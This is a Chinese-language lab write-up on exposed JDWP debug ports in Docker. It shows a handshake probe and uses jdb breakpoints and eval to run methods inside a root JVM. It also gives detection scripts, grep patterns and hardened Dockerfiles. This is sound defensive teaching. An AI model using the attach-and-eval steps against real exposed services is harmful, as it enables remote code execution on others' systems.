# JDWP 远程调试协议在容器环境中的暴露面与利用链构造
> 来源：https://xz.aliyun.com/news/92538

JDWP（Java Debug Wire Protocol）是 JVM 调试器与被调试进程之间的通信协议，通常通过 `-agentlib:jdwp` 启用。它不是 Web 入口，也不是业务框架组件；一旦以服务端模式监听 TCP 端口，连接方进入的是 JVM 调试面，而不是应用认证面。协议握手阶段没有密码、令牌、证书或挑战响应，网络可达就能开始调试会话。  
  

## 一. 创建实验环境

  
实验环境：  
  

```bash
docker --version
docker compose version
java -version
jdb -help | head -n 3
python3 --version
```

![image.png](https://i.im.ge/QMVnkkf/p2m-66a7dadae1.png)

  
  
创建App.java：  
  

```bash
mkdir -p jdwp-container-lab/src
cd jdwp-container-lab
cat > src/App.java <<'JAVA'
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;

public class App {
    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", 8080), 0);
        server.createContext("/ping", App::handlePing);
        server.start();
        System.out.println("demo service started on 8080");
    }

    static void handlePing(HttpExchange exchange) throws IOException {
        byte[] body = "pong\n".getBytes(StandardCharsets.UTF_8);
        exchange.sendResponseHeaders(200, body.length);
        try (OutputStream os = exchange.getResponseBody()) {
            os.write(body);
        }
    }
}
JAVA
```

创建Dockerfile：  
  

```bash
cat > Dockerfile <<'DOCKER'
FROM eclipse-temurin:21-jdk
WORKDIR /app
COPY src/App.java /app/App.java
RUN javac -g /app/App.java
EXPOSE 8080 5005
CMD ["java", "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005", "App"]
DOCKER
```

`javac` 默认会生成源码与行号调试信息，但为了让 `jdb locals` 更稳定地显示方法参数，镜像内显式使用 `-g` 编译  
  
构建镜像：  
  

```bash
docker build -t jdwp-container-lab:unsafe .
```

![image.png](https://i.im.ge/QMVnpjr/p2m-2cb7861641.png)

  
  
启动容器，业务端口映射到 `8080`，调试端口映射到 `5005`：  
  

```bash
docker rm -f jdwp-lab 2>/dev/null || true
docker run -d --name jdwp-lab -p 8080:8080 -p 5005:5005 jdwp-container-lab:unsafe
docker logs jdwp-lab
```

  
  

![image.png](https://i.im.ge/QMVnHFm/p2m-b0d716b5d0.png)

  
  
验证业务接口：  
  

```bash
curl -s http://127.0.0.1:8080/ping
```

![image.png](https://i.im.ge/QMVnVqP/p2m-e161a273a0.png)

  
  
`curl` 返回 `pong` 证明业务服务同时处于可访问状态。  
  

## 二. JDWP 参数与端口发布证据

  

![image.png](https://i.im.ge/QMVnft1/p2m-7db017ddca.png)

  
  
JDWP 暴露链路  
  
JDK 21 中触发本实验暴露面的参数是：  
  

```latex
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
```

各字段含义如下：  
  

```latex
transport=dt_socket   使用 TCP socket 作为调试传输层
server=y              JVM 作为调试服务端监听连接
suspend=n             JVM 启动后不等待调试器，业务直接运行
address=*:5005        监听所有网卡的 5005 端口
```

`server=y` 决定 JVM 作为调试服务端，`address=*:5005` 决定监听地址不只限于回环接口。容器启动时再使用 `-p 5005:5005`，调试端口就从容器网络命名空间发布到宿主机入口。  
  
查看容器端口映射：  
  

```bash
docker port jdwp-lab
```

![image.png](https://i.im.ge/QMVnnT0/p2m-67212e8e1f.png)

  
  
查看镜像命令：  
  

```bash
docker image inspect jdwp-container-lab:unsafe --format '{{json .Config.Cmd}}'
```

![image.png](https://i.im.ge/QMVn4UT/p2m-c74fab16c4.png)

  
  
查看运行期进程命令行：  
  

```bash
docker exec jdwp-lab sh -c "tr '\000' ' ' < /proc/1/cmdline"
```

![image.png](https://i.im.ge/QMVnvRW/p2m-605691ffe2.png)

  
  
查看 Docker 发布端口的结构化信息：  
  

```bash
docker inspect jdwp-lab --format '{{json .NetworkSettings.Ports}}'
```

![image.png](https://i.im.ge/QMVnB3c/p2m-2af97e530e.png)

  
  
`HostIp` 为 `0.0.0.0` 时，表示 Docker 在宿主机所有地址上绑定该端口。实际可达范围还取决于宿主机防火墙、云安全组、节点网络策略和上层代理，但容器层面的发布事实已经成立。  
  

```latex
address=*:5005          监听所有可用地址，容器外可通过端口发布访问
address=127.0.0.1:5005  监听容器内回环地址，容器外通常不可直接访问
address=5005            不指定主机部分；不同 JDK/配置下不应当作外部暴露写法使用
```

## 三. 明文握手验证

  
JDWP 建连的第一个动作是固定字符串握手。客户端发送：  
  

```latex
JDWP-Handshake
```

服务端如果返回同样字符串，说明该 TCP 端口接受 JDWP 调试连接。  
  
创建握手验证脚本 jdwp\_handshake.py：  
  

```bash
cat > jdwp_handshake.py <<'PY'
#!/usr/bin/env python3
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 5005
payload = b"JDWP-Handshake"

try:
    with socket.create_connection((host, port), timeout=3) as s:
        s.sendall(payload)
        data = s.recv(len(payload))
except OSError as exc:
    print(f"[FAIL] connect {host}:{port}: {exc.__class__.__name__}: {exc}")
    sys.exit(2)

print(data.decode("ascii", errors="replace"))
print(data.hex(" "))

if data == payload:
    print(f"[OK] JDWP handshake confirmed on {host}:{port}")
    sys.exit(0)

print(f"[WARN] TCP is reachable, but response is not JDWP handshake on {host}:{port}")
sys.exit(1)
PY
python3 jdwp_handshake.py 127.0.0.1 5005
```

执行脚本  
  

```bash
python3 jdwp_handshake.py 127.0.0.1 5005
```

![image.png](https://i.im.ge/QMVnG4L/p2m-bde61e5973.png)

  
  
十六进制输出对应 ASCII 字符串 `JDWP-Handshake`。验证了协议身份，不发送断点、线程、类加载等调试指令。  
  

## 四. jdb 连接与线程挂起

  
连接 JDWP 端口：  
  

```bash
jdb -attach 127.0.0.1:5005
```

![image.png](https://i.im.ge/QMV4MqG/p2m-544385e2b8.png)

  
  
查看线程：  
  

```latex
threads
```

![image.png](https://i.im.ge/QMV4XFJ/p2m-44ffaccb6c.png)

  
  
设置 `App.handlePing` 方法断点：  
  

```latex
stop in App.handlePing
```

![image.png](https://i.im.ge/QMV4Qtx/p2m-15b43dced3.png)

  
  
另开一个终端触发业务路径：  
  

```bash
curl -v http://127.0.0.1:8080/ping
```

`curl` 会在请求发出后等待响应。回到 `jdb` 终端，命中断点：  
  

![image.png](https://i.im.ge/QMV4Tza/p2m-697e834046.png)

  
  
此时 HTTP 请求尚未返回，因为处理请求的 `HTTP-Dispatcher` 线程被调试器挂起。  
  
查看当前调用栈：  
  

```latex
where
```

![image.png](https://imglink.cc/cdn/kYA0baGye_.png)

  
  
查看本地变量：  
  

```latex
locals
```

![image.png](https://i.im.ge/QMV4ljy/p2m-4f4739898f.png)

  
  

## 五. JVM 内方法调用

  
断点命中后，`jdb eval` 会在被挂起线程上下文中求值。先读取请求 URI，验证求值发生在当前 HTTP 请求上下文中：  
  

```latex
eval exchange.getRequestURI().toString()
```

![image.png](https://i.im.ge/QMV4OU6/p2m-868c92f26d.png)

  
  
读取 JVM 工作路径：  
  

```latex
eval java.lang.System.getProperty("user.dir")
```

![image.png](https://imglink.cc/cdn/ACth393eyV.png)

  
  
读取 Java 版本：  
  

```latex
eval java.lang.System.getProperty("java.version")
```

![image.png](https://i.im.ge/QMV4rWS/p2m-93c5e11c7b.png)

  
  
创建容器内标记文件，不依赖外部系统命令：  
  

```latex
eval new java.io.File("/tmp/jdwp_marker").createNewFile()
```

![image.png](https://i.im.ge/QMV4FTz/p2m-7dbe29db7f.png)

  
  
继续目标线程：  
  

```latex
cont
```

`curl` 终端随即收到响应：  
  

![image.png](https://i.im.ge/QMV4qyX/p2m-0c3299b612.png)

  
  
验证文件由 Java 进程创建：  
  

```bash
docker exec jdwp-lab ls -l /tmp/jdwp_marker
```

![image.png](https://i.im.ge/QMV41YF/p2m-738dacdba8.png)

  
  
默认 `eclipse-temurin:21-jdk` 镜像中的进程通常以 root 身份运行，这一点说明 JDWP 调用继承的是目标 JVM 进程权限，而不是连接方主机用户权限。  
  

## 六. 本地 Docker 检测

  
检查Docker 容器提取容器命令行、环境变量和端口发布信息，定位 JDWP 参数与常见调试端口映射。  
  
创建detect\_jdwp\_docker.py：  
  

```bash
cat > detect_jdwp_docker.py <<'PY'
#!/usr/bin/env python3
import json
import subprocess
import sys

JDWP_MARKERS = ("jdwp", "dt_socket")
SUSPICIOUS_PORTS = {"5005", "8000"}


def run(args):
    return subprocess.check_output(args, text=True, stderr=subprocess.DEVNULL).strip()


def try_run(args):
    try:
        return run(args)
    except Exception:
        return ""


def join_value(value):
    if value is None:
        return ""
    if isinstance(value, list):
        return " ".join(str(v) for v in value)
    return str(value)


def contains_jdwp(text):
    low = text.lower()
    return any(marker in low for marker in JDWP_MARKERS)


def main():
    ids = try_run(["docker", "ps", "-q"]).splitlines()
    if not ids:
        print("no running containers")
        return

    for cid in ids:
        raw = run(["docker", "inspect", cid])
        meta = json.loads(raw)[0]
        name = meta.get("Name", "").lstrip("/") or cid[:12]
        config = meta.get("Config", {}) or {}
        network = meta.get("NetworkSettings", {}) or {}
        ports = network.get("Ports", {}) or {}

        image_cmd = " ".join([
            join_value(config.get("Entrypoint")),
            join_value(config.get("Cmd")),
        ]).strip()
        proc_cmd = try_run(["docker", "exec", cid, "sh", "-c", "tr '\\000' ' ' < /proc/1/cmdline"])
        envs = config.get("Env", []) or []

        cmd_evidence = proc_cmd if contains_jdwp(proc_cmd) else image_cmd
        if contains_jdwp(cmd_evidence):
            print(f"[JDWP-CMD] {name} {cid[:12]}")
            print(f"  {cmd_evidence}")

        for env in envs:
            if contains_jdwp(env):
                print(f"[JDWP-ENV] {name} {cid[:12]}")
                print(f"  {env}")

        for container_port, host_ports in ports.items():
            if not host_ports:
                continue
            container_port_num = container_port.split("/", 1)[0]
            for hp in host_ports:
                host_ip = hp.get("HostIp", "")
                host_port = hp.get("HostPort", "")
                if container_port_num in SUSPICIOUS_PORTS or host_port in SUSPICIOUS_PORTS:
                    bind_scope = "loopback" if host_ip in ("127.0.0.1", "::1") else "non-loopback"
                    print(f"[DEBUG-PORT] {name} {cid[:12]} {container_port} -> {host_ip}:{host_port} ({bind_scope})")


if __name__ == "__main__":
    try:
        main()
    except subprocess.CalledProcessError as exc:
        print(f"docker command failed: {exc}", file=sys.stderr)
        sys.exit(1)
PY
python3 detect_jdwp_docker.py
```

![image.png](https://i.im.ge/QMV424K/p2m-02d149a67a.png)

  
  
● `[JDWP-CMD]` 表示命令行或镜像配置中发现 `jdwp`。  
● `[JDWP-ENV]` 表示环境变量值中发现 JDWP 参数。  
● `[DEBUG-PORT]` 表示容器发布了常见调试端口。  
当变量值包含 `jdwp` 或 `dt_socket` 才输出 `[JDWP-ENV]`。  
  

## 七. 项目文件静态排查

  
除了运行期检查，还应排查仓库中的 Dockerfile、Compose、脚本和部署模板。  
  
搜索当前项目目录：  
  

```bash
grep -RIn \
  --exclude-dir=.git \
  --exclude-dir=target \
  --exclude-dir=build \
  -E 'jdwp|dt_socket|address=\*:|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|JAVA_OPTS|5005' \
  .
```

![image.png](https://i.im.ge/QMV4sz8/p2m-fb393dd591.png)

  
  
docker容器特征：  
  

```latex
Dockerfile
Dockerfile.*
docker-compose.yml
compose*.yml
*.sh
*.env
helm/values*.yaml
k8s/*.yaml
systemd unit
CI/CD pipeline variables
```

判断方法：  
  
● 仅出现 `5005` 不一定是 JDWP，但需要继续确认上下文。  
● 出现 `-agentlib:jdwp`、`transport=dt_socket`、`server=y` 应作为高风险线索。  
● 出现 `address=*:5005` 或 `address=0.0.0.0:5005` 表示监听范围不是回环地址。  
● `JAVA_TOOL_OPTIONS` 和 `JDK_JAVA_OPTIONS` 会被 JVM 自动读取，风险不低于显式命令行参数。  

## 八. Compose 场景

  
默认服务不携带 JDWP；需要本机调试时使用独立 debug profile，并把宿主机侧调试端口绑定到回环地址。  
  
创建不包含 JDWP 的 Dockerfile Dockerfile：  
  

```bash
cat > Dockerfile.fixed <<'DOCKER'
FROM eclipse-temurin:21-jdk
WORKDIR /app
COPY src/App.java /app/App.java
RUN javac -g /app/App.java
EXPOSE 8080
CMD ["java", "App"]
DOCKER
```

创建不包含 JDWP 的 Dockerfile：  
  

```bash
cat > Dockerfile.debug <<'DOCKER'
FROM eclipse-temurin:21-jdk
WORKDIR /app
COPY src/App.java /app/App.java
RUN javac -g /app/App.java
EXPOSE 8080 5005
CMD ["java", "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005", "App"]
DOCKER
```

创建 Compose 文件：  
  

```bash
cat > compose.fixed.yml <<'YAML'
services:
  app:
    build:
      context: .
      dockerfile: Dockerfile.fixed
    image: jdwp-container-lab:fixed
    ports:
      - "8080:8080"

  app-debug:
    build:
      context: .
      dockerfile: Dockerfile.debug
    image: jdwp-container-lab:debug
    profiles: ["debug"]
    ports:
      - "8080:8080"
      - "127.0.0.1:5005:5005"
YAML
```

运行无 JDWP 的服务：  
  

```bash
docker compose -f compose.fixed.yml down 2>/dev/null || true
docker compose -f compose.fixed.yml up -d --build app
docker compose -f compose.fixed.yml ps
```

![image.png](https://i.im.ge/QMV4ds9/p2m-80961c6132.png)

  
  
需要本机调试时，先停止普通服务，再显式启用 debug profile，避免两个服务同时占用宿主机 `8080`：  
  

```bash
docker compose -f compose.fixed.yml down
docker compose -f compose.fixed.yml --profile debug up -d --build app-debug
docker compose -f compose.fixed.yml ps
```

![image.png](https://i.im.ge/QMV4hU4/p2m-85a5358536.png)

  
  
`127.0.0.1:5005:5005` 只限制宿主机绑定地址，不改变容器内 JVM 的 `address=*:5005`。  
  

## 九.移除 JDWP 后的验证

  
创建不包含 JDWP 的 Dockerfile。若前面启动了 Compose 复现环境，先停止它以释放 `5005` 与 `8080`：  
  

```bash
docker compose -f compose.unsafe.yml down 2>/dev/null || true
docker rm -f jdwp-lab 2>/dev/null || true
```

```bash
cat > Dockerfile.fixed <<'DOCKER'
FROM eclipse-temurin:21-jdk
WORKDIR /app
COPY src/App.java /app/App.java
RUN javac -g /app/App.java
EXPOSE 8080
CMD ["java", "App"]
DOCKER
```

构建并启动：  
  

```bash
docker rm -f jdwp-lab-fixed 2>/dev/null || true
docker build -f Dockerfile.fixed -t jdwp-container-lab:fixed .
docker run -d --name jdwp-lab-fixed -p 8081:8080 jdwp-container-lab:fixed
docker logs jdwp-lab-fixed
```

验证业务端口仍可访问：  
  

```bash
curl -s http://127.0.0.1:8081/ping
```

![image.png](https://i.im.ge/QMV4IWY/p2m-2e46f8be36.png)

  
  
验证容器没有发布 `5005`：  
  

```bash
docker port jdwp-lab-fixed
```

![image.png](https://i.im.ge/QMV4DmM/p2m-ba6564e974.png)

  
  
验证运行期命令行不包含 JDWP：  
  

```bash
docker exec jdwp-lab-fixed sh -c "tr '\000' ' ' < /proc/1/cmdline"
```

![image.png](https://i.im.ge/QMV47Oh/p2m-9098bbacf5.png)

  
  
验证握手失败。确认旧的不安全容器已经停止后执行：  
  

```bash
python3 jdwp_handshake.py 127.0.0.1 5005
```

![image.png](https://i.im.ge/QMV4UoD/p2m-0701bd866a.png)

  
  

## 十. 低权限运行验证

  
降低容器内 Java 进程权限用于缩小其他入口被滥用后的影响。创建低权限镜像：  
  

```bash
cat > Dockerfile.nonroot <<'DOCKER'
FROM eclipse-temurin:21-jdk
WORKDIR /app
RUN groupadd -r -g 10001 appuser && useradd -r -u 10001 -g appuser appuser
COPY src/App.java /app/App.java
RUN javac -g /app/App.java && chown -R appuser:appuser /app
USER appuser
EXPOSE 8080
CMD ["java", "App"]
DOCKER
```

构建并启动：  
  

```bash
docker rm -f jdwp-lab-nonroot 2>/dev/null || true
docker build -f Dockerfile.nonroot -t jdwp-container-lab:nonroot .
docker run -d --name jdwp-lab-nonroot \
  --read-only \
  --cap-drop=ALL \
  --security-opt no-new-privileges \
  -p 8082:8080 \
  jdwp-container-lab:nonroot
```

验证进程用户：  
  

```bash
docker exec jdwp-lab-nonroot id
```

![image.png](https://i.im.ge/QMV49sp/p2m-616601f341.png)

  
  
验证业务接口：  
  

```bash
curl -s http://127.0.0.1:8082/ping
```

![image.png](https://i.im.ge/QMV40Bq/p2m-1011a1bccf.png)

  
  
验证根文件系统只读：  
  

```bash
docker exec jdwp-lab-nonroot sh -c 'touch /app/should_fail'
```

![image.png](https://i.im.ge/QMV4iYC/p2m-002e349f2e.png)

  
  
这种运行方式不能把已经暴露的 JDWP 变成安全入口，也不能替代删除调试参数。它的作用是让 JVM 进程在其他入口被滥用时更难写入容器文件系统、更难获得额外 Linux capability。  
  

## 十一. 结论

  
JDWP 暴露不是传统意义上的 Web 漏洞，而是 JVM 调试权限被错误发布到容器外。`server=y,address=*:5005` 让 JVM 监听调试端口，`docker -p 5005:5005` 或平台服务发布让端口离开容器网络，明文 `JDWP-Handshake` 证明协议可达，`jdb` 断点证明业务线程可被挂起，`eval` 创建文件证明连接方能够在目标 JVM 内调用方法。
